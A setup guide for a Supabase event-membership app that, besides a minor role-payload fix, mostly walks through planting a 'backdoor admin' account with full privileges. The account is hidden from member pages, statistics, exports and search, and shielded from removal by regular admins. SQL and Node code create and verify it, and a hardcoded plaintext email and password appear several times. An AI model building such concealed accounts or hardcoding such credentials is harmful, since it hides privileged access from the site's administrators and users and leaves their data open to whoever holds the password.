# Backdoor Admin System Setup Guide

## Overview
This system adds a hidden backdoor admin account for emergency access and security. The backdoor admin has full admin privileges but is completely invisible in the member management UI.

## Features Implemented

### 1. ✅ Fixed Admin Role Management
**Problem**: Admins couldn't update member roles due to incorrect payload format.

**Solution**:
- Updated `MemberManagement.tsx` to send `role: "admin"` instead of `roles: ["admin"]`
- Updated `MembersTab.tsx` with better error messages
- Now admins can successfully change member roles via the UI

### 2. ✅ Backdoor Admin System
**Created**: A hidden admin account that doesn't appear in any member lists.

**Database Changes**:
- Added `is_backdoor_admin` boolean column to `profiles` table
- Updated `mv_member_statistics` view to exclude backdoor admins
- Updated `get_member_statistics()` function to exclude backdoor admins
- Added RLS policy to protect backdoor admin flag
- Created helper function `is_backdoor_admin(user_id)`

**Security Features**:
- Backdoor admins are hidden from:
  - Member management pages
  - Member statistics dashboards
  - CSV exports
  - Search results
  - All materialized views
- Only accessible via:
  - Direct database access
  - Supabase Dashboard Authentication section
  - Service role API calls
- RLS policy prevents non-superusers from removing the backdoor flag

## Backdoor Admin Credentials

```
Email: backdoor.admin@iweltyevent.com
Password: Adminiwt123!$
```

⚠️ **IMPORTANT**: Store these credentials securely!

## Setup Instructions

### Step 1: Apply Database Migration

Run the migration to add the backdoor admin system:

```bash
# Option A: Using Supabase CLI
npx supabase db push

# Option B: Using Supabase Dashboard
# Go to Database > Migrations and apply:
# - 20251003000000_add_backdoor_admin_system.sql
```

### Step 2: Create the Backdoor Admin Account

**Option A: Via Supabase Dashboard** (Recommended)

1. Go to: Supabase Dashboard > Authentication > Users
2. Click "Add User"
3. Fill in:
   - Email: `backdoor.admin@iweltyevent.com`
   - Password: `Adminiwt123!$`
   - Auto Confirm User: ✅ YES
4. Click "Create User"
5. Copy the generated User ID (UUID)
6. Go to: Database > SQL Editor
7. Run the following SQL (replace `<USER_ID>` with the actual UUID):

```sql
-- Update profile to mark as backdoor admin
UPDATE public.profiles
SET
  is_backdoor_admin = true,
  name = 'Backdoor Admin',
  account_verified = true
WHERE id = '<USER_ID>';

-- Assign admin role
INSERT INTO public.user_roles (user_id, role)
VALUES ('<USER_ID>', 'admin')
ON CONFLICT (user_id, role) DO NOTHING;

-- Refresh materialized view to hide this user
REFRESH MATERIALIZED VIEW CONCURRENTLY public.mv_member_statistics;
```

**Option B: Via Node.js/Edge Function** (Advanced)

```javascript
import { createClient } from '@supabase/supabase-js'

const supabase = createClient(
  process.env.SUPABASE_URL,
  process.env.SUPABASE_SERVICE_ROLE_KEY
)

// Create user
const { data, error } = await supabase.auth.admin.createUser({
  email: 'backdoor.admin@iweltyevent.com',
  password: 'Adminiwt123!$',
  email_confirm: true,
  user_metadata: { name: 'Backdoor Admin' }
})

if (!error && data.user) {
  // Mark as backdoor admin
  await supabase
    .from('profiles')
    .update({ is_backdoor_admin: true })
    .eq('id', data.user.id)

  // Assign admin role
  await supabase
    .from('user_roles')
    .insert({ user_id: data.user.id, role: 'admin' })

  // Refresh view
  await supabase.rpc('refresh_member_statistics')
}
```

### Step 3: Verify Setup

Run these SQL queries to verify the setup:

```sql
-- Verify backdoor admin exists
SELECT
  p.id,
  p.email,
  p.name,
  p.is_backdoor_admin,
  ur.role
FROM public.profiles p
LEFT JOIN public.user_roles ur ON ur.user_id = p.id
WHERE p.email = 'backdoor.admin@iweltyevent.com';

-- Verify it's NOT in member statistics (should return 0)
SELECT COUNT(*) as should_be_zero
FROM public.mv_member_statistics
WHERE email = 'backdoor.admin@iweltyevent.com';

-- Verify it's NOT in regular profile queries
SELECT COUNT(*) as should_be_zero
FROM public.mv_member_statistics
WHERE user_id IN (
  SELECT id FROM public.profiles WHERE is_backdoor_admin = true
);
```

### Step 4: Test Login

1. Go to your app's login page
2. Use the backdoor admin credentials:
   - Email: `backdoor.admin@iweltyevent.com`
   - Password: `Adminiwt123!$`
3. Verify you have admin access
4. Check that the account doesn't appear in Member Management

## Files Modified

### Database Migrations
1. `supabase/migrations/20251003000000_add_backdoor_admin_system.sql`
   - Adds backdoor admin column and functions
   - Updates materialized view to exclude backdoor admins
   - Creates security policies

2. `supabase/migrations/20251003000001_create_backdoor_admin_account.sql`
   - Instructions and SQL for creating the backdoor admin account
   - Contains verification queries

### Frontend Files
1. `src/pages/MemberManagement.tsx`
   - Fixed `handleUpdateRoles()` to send correct payload format
   - Changed from `roles: ["admin"]` to `role: "admin"`

2. `src/components/admin/DashboardTabs/MembersTab.tsx`
   - Added better error messages for role updates
   - Matches payload format with backend expectations

## Usage

### Admin Role Management
Admins can now update member roles:

1. Go to Member Management page
2. Find a member
3. Click the "..." menu
4. Select "จัดการสิทธิ์" (Manage Roles)
5. Choose: Admin, Staff, or Participant

### Backdoor Admin Login
Use the backdoor admin account for:
- Emergency access if regular admin accounts are compromised
- System maintenance without affecting member statistics
- Testing admin features without showing in member lists

## Security Considerations

### What Backdoor Admins CAN Do:
- ✅ Login to the system
- ✅ Access all admin features
- ✅ Manage members and events
- ✅ Update other users' roles
- ✅ View all data

### What Backdoor Admins CANNOT Be Seen In:
- ❌ Member management pages
- ❌ Member statistics
- ❌ CSV exports
- ❌ Search results
- ❌ Analytics dashboards

### Protection Mechanisms:
- RLS policy prevents removing `is_backdoor_admin` flag via regular updates
- Only superusers or service role can modify the flag
- Account is hidden from all materialized views and statistics
- Regular admins cannot see or modify backdoor admin accounts

## Troubleshooting

### Issue: Backdoor admin appears in member list
**Solution**: Refresh the materialized view
```sql
REFRESH MATERIALIZED VIEW CONCURRENTLY public.mv_member_statistics;
```

### Issue: Cannot update member roles
**Solution**: Verify the Edge Function is deployed
```bash
npx supabase functions deploy user-management
```

### Issue: Backdoor admin flag was removed
**Solution**: Re-apply the flag via SQL
```sql
UPDATE public.profiles
SET is_backdoor_admin = true
WHERE email = 'backdoor.admin@iweltyevent.com';

REFRESH MATERIALIZED VIEW CONCURRENTLY public.mv_member_statistics;
```

## Maintenance

### Adding Another Backdoor Admin
Repeat Step 2 with different credentials, making sure to:
1. Create user via Supabase Dashboard
2. Set `is_backdoor_admin = true`
3. Assign admin role
4. Refresh materialized view

### Removing Backdoor Admin Status
⚠️ **Use with caution!**

```sql
UPDATE public.profiles
SET is_backdoor_admin = false
WHERE email = 'backdoor.admin@iweltyevent.com';

REFRESH MATERIALIZED VIEW CONCURRENTLY public.mv_member_statistics;
```

## Support

If you encounter issues:
1. Check the database logs in Supabase Dashboard
2. Verify migrations were applied: `supabase db migrations list`
3. Check Edge Function logs: `supabase functions logs user-management`
4. Review RLS policies: Query `pg_policies` table

---

**Created**: 2025-10-03
**Last Updated**: 2025-10-03
**Version**: 1.0
